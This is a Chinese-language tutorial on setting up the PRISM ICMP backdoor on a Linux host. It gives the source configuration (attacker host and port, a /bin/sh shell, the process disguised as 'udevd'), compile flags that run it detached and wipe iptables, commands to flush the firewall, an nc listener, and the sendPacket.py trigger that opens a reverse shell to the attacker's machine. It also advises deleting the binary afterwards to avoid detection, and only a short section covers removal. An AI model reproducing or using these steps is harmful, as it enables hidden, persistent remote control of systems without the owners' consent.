4、ICMP后门

在控制端下载脚本：git clone https://github.com/andreafabrizi/prism.git

git下来之后，还需要进行编辑操作

先编辑prism.c，修改宏定义部分：



40 #ifdef STATIC
 
41 # define REVERSE_HOST     "10.0.0.1"  //连接到主控机的IP地址
 
42 # define REVERSE_PORT     19832   //连接到主控机的端口号
 
43 # define RESPAWN_DELAY    15  //后门机尝试连接的空闲时间间隔
 
44 #else
 
45 # define ICMP_PACKET_SIZE 1024  //ICMP数据包的大小
 
46 # define ICMP_KEY         "linger"  //连接的密码
 
47 #endif
 
48
 
49 #define VERSION          "0.5"   //版本信息
 
50 #define MOTD             "PRISM v"VERSION" started\n\n# "  //后门机连接时显示的消息
 
51 #define SHELL            "/bin/sh"  //shell执行的位置
 
52 #define PROCESS_NAME     "udevd"   //创建的进程名称
交叉编译prism后门

gcc <..OPTIONS..> -Wall -s -o prism prism.c

可用的参数<OPTION>选项：

-DDETACH //后台运行

-DSTATIC //只用STATIC模式（默认是ICMP模式）

-DNORENAME //不再重命名进程名

-DIPTABLES //清除所有iptables规则表项

如：gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c

编译好之后把prism上传到远程后门主机，再运行sendPacket.py脚本，需要root权限。最好就是将prism.c文件上传到后门主机再进行编译，这样更容易成功。

iptables -F
iptables -x
iptables -L

在攻击者机器上运行nc等待后门的连接：nc -l -p 6666

使用sendPacket.py脚本（或其他数据包生成器）将激活数据包发送到后门：

./sendPacket.py 192.168.30.141 123456 192.168.30.131 6666

192.168.30.141 是运行棱镜后门的受害者机器

123456是密钥

192.168.30.131是攻击者机器地址

6666是攻击者机器端口



这种后门方式对于采用了很多限制比如限制了ssh的远程服务器来说，是比较不错的，而且prism服务端运行后会在后门一直运行，除非重启服务器。所以运行后门后删除自身文件将不容易被发现。

清除方式

因为该后门重启会失效，除非写在开机启动项里，所以首先要检查启动项有没有异常情况，比如/etc/rc.local是否有未知的启动脚本

其次，这个后门可以改变后门进程名，但是还是有进程存在，所以要查出这个未知进程，可以用工具查找，kill掉

然后，该后门是使用了icmp的ping包激活的，所以可以过滤icmp包

最后，需要设置好严格的iptables规则，这个后门可以按照攻击者的设置尝试清楚iptables规则，需要定期查看iptables规则是否正常

=============================================================================================================================
　PRISM只有两个主文件，配置简单，能在Linux、Solaris、AIX、BSD/Mac、Android等多个系统上运行，支持两种工作模式：ICMP 和 STATIC 模式。

ICMP模式

　　使用这种模式的后门将会在后台等待特定的包含主机/端口连接信息的ICMP数据包，通过私有密钥可以阻止第三方访问。后门进程接受ping包激活（总不会连ping包都不让过了靶>_<）

　　首先，在攻击者的机器上运行netcat来等待后门进入的连接：

1
～$ nc -l -p 9999
 　　再使用sendPacket.py脚本（或其他数据包生成器，如nemesis-1.4）发送激活包到后门主机，以使后门主机反弹连接到主控机的指定端口：

1
2
3
4
5
./sendPacket.py 10.0.0.5 linger 10.0.0.10 9999
//10.0.0.5 远程主机（靶机）的IP地址
//linger 连接密码
//10.0.0.10 主控机IP地址
//9999 主控机连接端口
 STATIC模式

　　使用这种模式，后门主机将会主动尝试连接到指定端口的的IP地址上，所以只要在指定IP上监听指定端口等待连接就可以了。但是，缺点很明显，很任意暴露攻击者的IP地址，而且使用不够灵活。

1
$ nc -l -p [PORT]
 　　当然，作为一款迷你级的后门木马。它还是有很多优点的：

　　两种工作模式、运行时进程重命名、不会监听端口、自动清除iptables规则表、采用C语言编写（代码仅有200来行），所以不需要任何库支持。
